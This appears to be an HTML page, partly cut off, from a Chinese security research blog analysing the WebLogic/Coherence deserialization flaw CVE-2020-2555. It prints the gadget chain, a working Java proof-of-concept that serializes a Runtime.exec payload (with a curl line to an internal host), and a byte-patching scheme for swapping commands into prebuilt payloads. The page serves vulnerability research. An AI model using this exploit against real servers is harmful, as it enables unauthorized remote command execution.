@@ -1,0 +1,1694 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="Qa1IYEJZoz">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="背景在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。 漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足">
+<meta name="keywords" content="weblogic,t3,cve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漫谈 Weblogic CVE-2020-2555">
+<meta property="og:url" content="http://www.r4v3zn.com/posts/975312a1/index.html">
+<meta property="og:site_name" content="R4v3zn&#39;s Blog">
+<meta property="og:description" content="背景在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。 漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_b636d89a6eb8c2dbba118c4cc07b731f">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_0f5b23296a862f2bf90370233b2a428a">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_2c795b06cae4deaec7a9e1a2e7a70846">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_32813d84b5b7121e60ed103496b9461a">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_7995538696b115c9a52e53e48225f3f7">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_0bee2748524ba8ade43d6bee4bd4b26a">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_5081b81f79e96197d8b0b491eae77ccc">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_3cb6d6f9e5463f4578f82b9dfbdf05d3">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_88ef785f8ba3ed1f08e1e3a15cf55d95">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_543303e6d4e05fa5d9326cfb0fcd1604">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_503b3c294714108a7f95717d1d17a44e">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_8bea9e897bba8b002cf2409af5d28667">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_201846b512ca326fa649704c59c54825">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_ead5da4005a3589a5484bcd42338a0a3">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_a1d57640e6d210dd3f3f76bca6c19a17">
+<meta property="og:image" content="https://img.zhiiyun.com/blog_aaab4d9d707e33acd313e176c868bce6">
+<meta property="og:updated_time" content="2020-11-11T08:06:56.299Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漫谈 Weblogic CVE-2020-2555">
+<meta name="twitter:description" content="背景在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。 漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足">
+<meta name="twitter:image" content="https://img.zhiiyun.com/blog_b636d89a6eb8c2dbba118c4cc07b731f">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="R4v3zn's Blog" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="http://www.r4v3zn.com/posts/975312a1/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>漫谈 Weblogic CVE-2020-2555 | R4v3zn's Blog</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?538261c94933aff82352b0b81987466e";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R4v3zn's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-celery-中文手册">
+
+    
+    
+      
+    
+
+    
+
+    <a href="https://www.celerycn.io/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-book"></i> <br>Celery 中文手册</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/0nise" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.r4v3zn.com/posts/975312a1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4v3zn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4v3zn's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">漫谈 Weblogic CVE-2020-2555
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-11 17:01:26" itemprop="dateCreated datePublished" datetime="2020-03-11T17:01:26+08:00">2020-03-11</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-11-11 16:06:56" itemprop="dateModified" datetime="2020-11-11T16:06:56+08:00">2020-11-11</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/漏洞研究/" itemprop="url" rel="index"><span itemprop="name">漏洞研究</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。</p>
+<p>漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足之处，导致漏洞检测效率变低，不足之处主要体现在：</p>
+<p><strong>1 目前所有的利用工具都是通过动态编译进行生产 POC 文件而且必须要有 java 环境。</strong></p>
+<p><strong>2.  公布的 POC 只是针对单独一个版本有效，无法适应多个 Weblogic 版本。</strong></p>
+<p>漏洞影响情况：</p>
+<ul>
+<li>Oracle Coherence 3.7.1.17</li>
+<li>Oracle Coherence &amp; Weblogic  12.1.3.0.0</li>
+<li>Oracle Coherence &amp; Weblogic 12.2.1.3.0</li>
+<li>Oracle Coherence &amp; Weblogic 12.2.1.4.0</li>
+</ul>
+<p>通过研究发现 Weblogic 10.3.6.0 版本不受影响范围内，虽然该版本默认自带了 Coherence（3.7），通过调试发现该版本默认并未启用 Coherence，所以 Weblogic 10.3.6.0 不在受影响范围内。</p>
+<p><strong>注：</strong></p>
+<p><strong>1. 经过大量的测试，我们的 POC 可稳定运行在多个操作系统、多个 weblogic 版本、多个 JDK 版本中。</strong></p>
+<p><strong>2. 以上测试及分析环境全部基于内部环境。</strong></p>
+<h2 id="漏洞调试分析"><a href="#漏洞调试分析" class="headerlink" title="漏洞调试分析"></a>漏洞调试分析</h2><p><strong>本文基于 Weblogic 12.1.3 版本进行研究分析测试。</strong></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>修改目录 <code>user_project/domains/bin</code> 目录中 <code>setDomainEnv.cmd</code> 或者 <code>setDomainEnv.sh</code>  文件，加<code>if %debugFlag == &quot;false&quot;%</code> 之前加入 <code>set debugFlag=true</code>。</p>
+<p>拷贝 <code>Oracle_Home</code> 目录下所有文件至调试目录，并且 <code>coherence\lib</code> 添加 <code>Libraries</code>：</p>
+<p><img src="https://img.zhiiyun.com/blog_b636d89a6eb8c2dbba118c4cc07b731f" alt=""></p>
+<p>配置 <code>Remote</code> 方式进行远程调试， ip 设置为开启 <code>set debugFlag=true</code> 的服务器 IP， 端口为 <code>8453</code> ：</p>
+<p><img src="https://img.zhiiyun.com/blog_0f5b23296a862f2bf90370233b2a428a" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该漏洞主要是因为 <code>com.tangosol.util.filter.LimitFilter#toString</code> 方法内部可通过 <code>m_comparator</code> 和 <code>m_oAnchorTop</code> 可自定义进行设置，形成利用链条导致漏洞的发生，以下为整个利用链条：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                LimitFilter.toString()</span><br><span class="line">                    ChainedExtractor.extract()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p>通过利用利用链条，可以基于 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 中的 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java" target="_blank" rel="noopener">CommonsCollections5</a> 进行构造利用 POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        String cmd = &quot;curl http://10.10.10.172:9999/Poc.class&quot;;</span><br><span class="line">        cmd = &quot;calc&quot;;</span><br><span class="line">        ValueExtractor[] valueExtractors = new ValueExtractor[]&#123;</span><br><span class="line">                new ReflectionExtractor(&quot;getMethod&quot;, new Object[]&#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0]</span><br><span class="line">                &#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;invoke&quot;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;&#125;)</span><br><span class="line">//                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        // chain</span><br><span class="line">        LimitFilter limitFilter = new LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime.class);</span><br><span class="line">        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);</span><br><span class="line">        m_comparator.setAccessible(true);</span><br><span class="line">        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));</span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);</span><br><span class="line">        m_oAnchorTop.setAccessible(true);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/0nise/IdeaProjects/vuldebug/cve-2020-2555/src/main/java/122130_linux_calc.666&quot;));</span><br><span class="line">        objectOutputStream.writeObject(expException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.zhiiyun.com/blog_2c795b06cae4deaec7a9e1a2e7a70846" alt=""></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞主要是因为 <code>com.tangosol.util.filter.LimitFilter#toString</code> 触发，通过跟踪我们可以看到 <code>m_oAnchorTop</code>  为 <code>classs java.lang.Runtime</code> ， 以及 <code>m_comparator</code> 为 <code>ValueExtractor</code> 接口的 <code>ChainedExtractor</code> 实现。</p>
+<p><img src="https://img.zhiiyun.com/blog_32813d84b5b7121e60ed103496b9461a" alt=""></p>
+<p><img src="https://img.zhiiyun.com/blog_7995538696b115c9a52e53e48225f3f7" alt=""></p>
+<p>核心通过 <code>extractor.extract</code> 进行触发，跟踪代码会跳入 <code>com.tangosol.util.extractor.ChainedExtractor#extract</code> ，并且将每次执行结果作为参数，通过 <code>aExtractor[i].extract(oTarget)</code> 进行执行，第一次 <code>oTarget</code> 参数值为 <code>class java.lang.Runtime</code></p>
+<p><img src="https://img.zhiiyun.com/blog_0bee2748524ba8ade43d6bee4bd4b26a" alt=""></p>
+<p>跟踪进入 <code>aExtractor[i].extract(oTarget)</code>  会跳入 <code>com.tangosol.util.extractor.ReflectionExtractor#extract</code> ，最后通过 <code>method.invoke</code> 反射执行，也就是说开始执行 <code>java.lang.Runtime.getRuntime</code>，最后讲执行的结果进行 <code>return</code>，类型为 <code>java.lang.Runtime</code>，所以整个方法执行的代码为 <code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]);</code></p>
+<p><img src="https://img.zhiiyun.com/blog_5081b81f79e96197d8b0b491eae77ccc" alt=""></p>
+<p>第二次将<code>java.lang.Runtime.getRuntime</code> （也就是 <code>java.lang.Runtime</code>） 作为 <code>oTarget</code> 参数值进行传入执行<br>进行循环 <code>method.invoke</code>，反射执行 <code>invoke</code> ，最终执行代码为<br><code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]).invoke(null, new Object[0])</code> ，最后执行完毕结果为 <code>java.lang.Runtime</code> 类，并且将 <code>return</code> 提供下次进行调用执行。</p>
+<p><img src="https://img.zhiiyun.com/blog_3cb6d6f9e5463f4578f82b9dfbdf05d3" alt=""><br><img src="https://img.zhiiyun.com/blog_88ef785f8ba3ed1f08e1e3a15cf55d95" alt=""><br><img src="https://img.zhiiyun.com/blog_543303e6d4e05fa5d9326cfb0fcd1604" alt=""></p>
+<p>最后通过 <code>java.lang.Runtime.exec</code> 进行反射执行命令，最终执行的代码为 <code>runtime.exec(new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;})</code> 达到执行命令的目的，弹出记事本。</p>
+<p><img src="https://img.zhiiyun.com/blog_503b3c294714108a7f95717d1d17a44e" alt=""> </p>
+<p><img src="https://img.zhiiyun.com/blog_8bea9e897bba8b002cf2409af5d28667" alt=""></p>
+<p><img src="https://img.zhiiyun.com/blog_201846b512ca326fa649704c59c54825" alt=""></p>
+<h3 id="weblogic-10-3-6"><a href="#weblogic-10-3-6" class="headerlink" title="weblogic 10.3.6"></a>weblogic 10.3.6</h3><p>weblogic 10.3.6 版本默认自带 coherence_3.7 ，但通过 Debug 调试发现 weblogic 10.3.6 并未启用 coherence_3.7 所以无法针对 weblogic 10.3.6  进行测试，但 coherence_3.7 版本中 <code>com.tangosol.util.filter.LimitFilter#toString</code> 漏洞仍然存在，所以  coherence 3.7 版本存在漏洞但 weblogic 10.3.6 默认情况下不存在该漏洞。</p>
+<p><img src="https://img.zhiiyun.com/blog_ead5da4005a3589a5484bcd42338a0a3" alt=""></p>
+<p><img src="https://img.zhiiyun.com/blog_a1d57640e6d210dd3f3f76bca6c19a17" alt=""></p>
+<h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><p>经过分析发现 POC 很多不足之处，导致漏洞检测效率变低，同时无法进行通过其他语言开发调用。</p>
+<h3 id="动态序列化问题"><a href="#动态序列化问题" class="headerlink" title="动态序列化问题"></a>动态序列化问题</h3><p>如果 POC 用于非 java 语言开发的扫描框架时，是非常麻烦的要么是将代码集成  <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 然后通过进程调用的方式动态生成序列化文件，但该方法会不断的通过进程调用执行代码，会造成很大的资源开销。除了使用这种方法之外还可以通过加载以前的 POC 进行二进制读取并且替换代码重新生成序列化文件。</p>
+<p>通过研究分析发现，修改参数内容时变动的内容主要为 <code>13 5B 4C 6A 61 76 61 2E 6C 61 6E 67 2E 53 74 72 69 6E 67 3B AD D2 56 E7 E9 1D 7B 47 02 00 00 78 70 00 00 00 03 74 00</code> 字节至 <code>00 04 65 78 65 63 70 70 76 72 00 11 6A 61 76 61 2E 6C 61 6E 67 2E 52 75 6E 74 69 6D 65 00 00 00 00 00 00 00 00 00 00 00 78 70</code> 的内容信息，其中左图的参数为 <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code>，右图的参数为 <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code>。</p>
+<p><img src="https://img.zhiiyun.com/blog_aaab4d9d707e33acd313e176c868bce6" alt=""></p>
+<p>通过分析相同 weblogic 版本中通过 <code>coherence.jar</code> 生成的 <code>payload</code>，比对其中差异发现参数构造的方式为：每个参数的长度转换为 16 进制，占用 2 个字节，不足用 <code>0</code> 补足 + 每个参数值的 Hex  码 + ( 70 weblogic  12.2.1.3.0 版本最后一位参数 ) +74 （作者理解为标识符），所以转换对应情况如下：</p>
+<p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code> （ weblogic 12.2.1.3.0，需要加 70 其他版本不需要）对应的转换情况为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 07 6E 6F 74 65 70 61 64  70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 07 = &quot;notepad&quot;.length()</span><br><span class="line">6E 6F 74 65 70 61 64 = &quot;notepad&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure>
+<p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code> （ weblogic 12.2.1.3.0，需要加 70 其他版本不需要）对应的转换情况为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 04 63 61 6C 63 70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 04 = &quot;calc&quot;.length()</span><br><span class="line">63 61 6C 63  = &quot;calc&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure>
+<p>了解了参数变动的规律以及对应的字节码，我们就可以基于该方式进行动态构建序列化文件。</p>
+<p>测试中使用的各个版本生产 POC 序列化文件存放在 <a href="https://github.com/0nise/CVE-2020-2555" target="_blank" rel="noopener">CVE-2020-2555</a> <code>file</code> 目录中。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">版本</th>
+<th style="text-align:center">文件名</th>
+<th style="text-align:center">描述</th>
+<th style="text-align:center">操作系统</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_calc.666" target="_blank" rel="noopener">121300_calc.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_notepad.666" target="_blank" rel="noopener">121300_notepad.666</a></td>
+<td style="text-align:center">notepad</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
